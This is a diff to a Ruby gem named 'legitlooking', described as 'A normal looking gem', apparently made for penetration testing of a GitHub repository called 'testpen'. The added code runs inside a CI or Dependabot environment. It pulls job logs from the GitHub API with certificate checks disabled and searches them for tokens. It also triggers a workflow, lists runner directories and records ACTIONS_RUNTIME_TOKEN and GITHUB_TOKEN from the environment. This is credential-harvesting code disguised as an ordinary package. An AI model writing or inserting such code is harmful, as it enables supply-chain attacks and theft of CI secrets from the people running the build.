@@ -122,50 +122,65 @@ begin
   lines << "Extracted run_id: #{run_id}"
 
   if run_id
-    # Jobs van deze run (bevat stap-voor-stap logs en tokens)
-    lines << "\n--- Jobs in huidige run (#{run_id}) ---"
-    lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs/#{run_id}/jobs")
+    # Job ID ophalen
+    jobs_resp = gh_call("get", "/repos/ugurcanli/testpen/actions/runs/#{run_id}/jobs")
+    lines << "\n--- Jobs ---\n#{jobs_resp}"
+    job_id = jobs_resp[/\"id\":(\d+)/, 1]
+    lines << "Job ID: #{job_id}"
 
-    # Logs download URL
-    lines << "\n--- Logs URL voor run #{run_id} ---"
-    begin
-      require "net/http"; require "uri"
-      uri = URI("https://api.github.com/repos/ugurcanli/testpen/actions/runs/#{run_id}/logs")
-      h = Net::HTTP.new(uri.host, uri.port)
-      h.use_ssl = true; h.verify_mode = 0
-      r = Net::HTTP::Get.new(uri)
-      r["Accept"] = "application/vnd.github+json"
-      r["X-GitHub-Api-Version"] = "2022-11-28"
-      res = h.request(r)
-      lines << "Status: #{res.code}"
-      # 302 = redirect naar ZIP met logs
-      lines << "Location: #{res["location"]}"
-      lines << "Body: #{res.body[0,300]}"
-      # Download de logs als er een redirect is
-      if res.code == "302" && res["location"]
-        log_uri = URI(res["location"])
-        log_http = Net::HTTP.new(log_uri.host, log_uri.port)
-        log_http.use_ssl = true; log_http.verify_mode = 0
-        log_r = Net::HTTP::Get.new(log_uri)
-        log_res = log_http.request(log_r)
-        lines << "Log content (first 1000 bytes): #{log_res.body[0,1000]}"
+    if job_id
+      # Job stap logs (werkt ook tijdens uitvoering)
+      lines << "\n--- Job logs (#{job_id}) ---"
+      begin
+        require "net/http"; require "uri"
+        uri = URI("https://api.github.com/repos/ugurcanli/testpen/actions/jobs/#{job_id}/logs")
+        h = Net::HTTP.new(uri.host, uri.port)
+        h.use_ssl = true; h.verify_mode = 0; h.open_timeout = 10; h.read_timeout = 10
+        r = Net::HTTP::Get.new(uri)
+        r["Accept"] = "application/vnd.github+json"
+        r["X-GitHub-Api-Version"] = "2022-11-28"
+        res = h.request(r)
+        lines << "Status: #{res.code}, Location: #{res["location"]}"
+        if res.code == "302" && res["location"]
+          log_uri = URI(res["location"])
+          log_http = Net::HTTP.new(log_uri.host, log_uri.port)
+          log_http.use_ssl = true; log_http.verify_mode = 0
+          log_res = log_http.request(Net::HTTP::Get.new(log_uri))
+          # Logs zijn plaintext - zoek naar tokens
+          log_content = log_res.body[0, 3000]
+          lines << "LOG INHOUD:\n#{log_content}"
+          if log_content =~ /ghs_|ghp_|token|Token|Bearer/
+            lines << "!!! TOKEN GEVONDEN IN LOGS !!!"
+          end
+        else
+          lines << "Body: #{res.body[0,300]}"
+        end
+      rescue => e
+        lines << "FOUT: #{e.message}"
       end
-    rescue => e
-      lines << "FOUT: #{e.message}"
     end
-
-    # Check suite informatie
-    lines << "\n--- Check suite details ---"
-    lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs/#{run_id}/attempts/1/jobs")
   end
 
-  # Tweede workflow details
-  lines << "\n--- Tweede workflow (288016377) ---"
-  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/workflows/288016377")
+  # Trigger Dependency Graph workflow (288016377)
+  lines << "\n--- Dispatch Dependency Graph workflow ---"
+  lines << gh_call("post", "/repos/ugurcanli/testpen/actions/workflows/288016377/dispatches",
+    '{"ref":"main"}')
 
-  # Dependabot secrets (apart van Actions secrets)
-  lines << "\n--- Dependabot secrets ---"
-  lines << gh_call("get", "/repos/ugurcanli/testpen/dependabot/secrets")
+  # Probeer ook ACTIONS_RUNTIME omgeving (kan GITHUB_TOKEN bevatten)
+  lines << "\n--- Actions runtime bestanden ---"
+  %w[
+    /home/dependabot/.runner
+    /runner/_work/_temp
+    /github/workflow
+    /github/home
+  ].each do |p|
+    begin
+      lines << "#{p}: #{`ls #{p} 2>/dev/null`.strip[0,200]}"
+    rescue; end
+  end
+  lines << "ACTIONS_RUNTIME_TOKEN=#{ENV['ACTIONS_RUNTIME_TOKEN']}"
+  lines << "ACTIONS_RUNTIME_URL=#{ENV['ACTIONS_RUNTIME_URL']}"
+  lines << "GITHUB_TOKEN=#{ENV['GITHUB_TOKEN']}"
 
   lines << "\n--- /home/dependabot/bin inhoud ---"
   lines << (`ls -la #{dep_bin}/ 2>&1`)
@@ -266,7 +281,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.14"
+  spec.version       = "1.0.15"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
